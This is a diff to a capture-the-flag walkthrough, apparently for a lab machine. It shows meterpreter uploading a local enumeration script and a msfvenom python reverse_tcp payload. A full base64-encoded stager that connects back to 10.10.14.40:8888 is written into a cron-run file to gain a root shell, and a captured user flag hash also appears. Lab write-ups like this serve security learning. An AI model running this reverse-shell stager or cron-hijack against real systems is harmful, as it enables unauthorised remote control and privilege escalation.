@@ -209,8 +209,18 @@ The next steps for me are upgrading the shell to meterpreter, snatching the user
 ```{r, engine='bash', sh}
 cat /home/mindy/user.txt
 914d0a4ebc177889b5b89a23f556fd75
+```
 
-run local enum shit
+The first step in local enum is always for me uploading the HighOnCovfefe script and checking the output :)
+( https://highon.coffee/blog/linux-local-enumeration-script/ )
+
+So i abort the current shell session here to go back to meterpreter, upload the local enum script, chmot it and run it.
+
+```{r, engine='bash', sh}
+meterpreter> upload covfefe.sh
+meterpreter> shell
+chmod a+x covfefe.sh
+./covfefe.sh
 ```
 
 Interesting output:
@@ -248,6 +258,7 @@ by running crontab -l we can confirm that it is indeed not "mindy" executing thi
 
 So lets try to escalate our privilege by creating a new msf payload.
 Then we start the msf reverse handler, overwrite the python file and wait for the cronjob to execute our payload.
+( that step could be easier to exploit. But i dont wanna spoil the challenge for other users that are with me on the box at the same time )
 
 ```{r, engine='bash', sh}
 msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.14.40 LPORT=8888
@@ -261,7 +272,7 @@ import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.
 Then we get the handler running and inject our payload in the file.
 
 ```{r, engine='bash', sh}
-echo "aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEwLjEwLjE0LjQwJyw4ODg4KSkKCQlicmVhawoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoNSkKbD1zdHJ1Y3QudW5wYWNrKCc" > /opt/tmp.py
+echo "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEwLjEwLjE0LjQwJyw4ODg4KSkKCQlicmVhawoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoNSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyhkLHsncyc6c30pCg==')))" > /opt/tmp.py
 ```
 
 Now we wait a minute, payload executes, shell spawns.
